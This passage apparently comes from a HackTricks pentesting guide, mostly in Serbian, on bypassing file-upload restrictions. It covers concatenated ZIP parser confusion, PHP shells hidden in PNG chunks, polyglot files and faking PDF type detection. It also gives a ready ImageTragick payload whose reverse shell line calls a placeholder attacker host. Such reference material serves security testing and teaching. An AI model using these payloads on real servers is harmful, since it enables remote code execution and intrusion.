- Napravite bezopasan arhiv (dozvoljeni tip, npr. PDF) i drugi arhiv koji sadrži blokirano proširenje (npr. `shell.php`).
- Spojite ih: `cat benign.zip evil.zip > combined.zip`.
- Ako server validira pomoću jednog parsera (vidi benign.zip), ali ekstrahuje pomoću drugog (obrađuje evil.zip), blokirana datoteka završava u putanji za ekstrakciju.

## ImageTragic

Otpremite ovaj sadržaj sa ekstenzijom slike da biste iskoristili ranjivost **(ImageMagick , 7.0.1-1)** (iz [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Embedding PHP Shell on PNG

Ugrađivanje PHP shell-a u IDAT chunk PNG fajla može efikasno zaobići određene operacije obrade slike. Funkcije `imagecopyresized` i `imagecopyresampled` iz PHP-GD su posebno relevantne u ovom kontekstu, jer se često koriste za promenу veličine i resampling slika. Sposobnost ugrađenog PHP shell-a da ostane nepromenjen nakon ovih operacija predstavlja značajnu prednost u određenim slučajevima upotrebe.

Detaljno istraživanje ove tehnike, uključujući metodologiju i potencijalne primene, dostupno je u sledećem članku: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Ovaj izvor pruža sveobuhvatno razumevanje procesa i njegovih implikacija.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot fajlovi služe kao jedinstveno sredstvo u cybersecurity-ju, ponašajući se kao kameleoni koji validno mogu postojati u više formata fajla istovremeno. Zanimljiv primer je [GIFAR](https://en.wikipedia.org/wiki/Gifar), hibrid koji funkcioniše i kao GIF i kao RAR arhiva. Takvi fajlovi nisu ograničeni samo na ovo sparivanje; kombinacije poput GIF i JS ili PPT i JS su takođe izvodljive.

Osnovna upotrebljivost polyglot fajlova leži u njihovoj sposobnosti da zaobiđu bezbednosne mere koje filtriraju fajlove na osnovu tipa. Uobičajena praksa u različitim aplikacijama podrazumeva dozvoljavanje samo određenih tipova fajlova za upload — poput JPEG, GIF ili DOC — kako bi se umanjio rizik od potencijalno opasnih formata (npr. JS, PHP ili Phar fajlova). Međutim, polyglot, usklađujući se sa strukturnim kriterijumima više formata, može prikriveno zaobići ta ograničenja.

Uprkos svojoj prilagodljivosti, polyglot fajlovi imaju ograničenja. Na primer, dok polyglot može istovremeno predstavljati PHAR file i JPEG, uspeh njegovog uploada može zavisiti od politike platforme po pitanju ekstenzija. Ako sistem strogo kontroliše dozvoljene ekstenzije, sama strukturna dvojakost polyglot-a možda neće biti dovoljna da garantuje upload.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Kako izbeći detekciju tipa fajla tako što ćete upload-ovati validan JSON fajl čak i ako to nije dozvoljeno tako što ćete ga predstaviti kao PDF (tehnike iz **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Sve dok su `%PDF` magic bytes u prvih 1024 bajta, smatra se validnim (pogledajte primer u postu)
- **`pdflib` library**: Dodajte lažni PDF format unutar polja JSON-a tako da biblioteka pomisli da je u pitanju pdf (pogledajte primer u postu)
- **`file` binary**: Može čitati do 1048576 bajta iz fajla. Jednostavno napravite JSON veći od toga tako da ne može parsirati sadržaj kao JSON, a zatim unutar JSON-a stavite početni deo pravog PDF-a i on će pomisliti da je PDF

## References

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
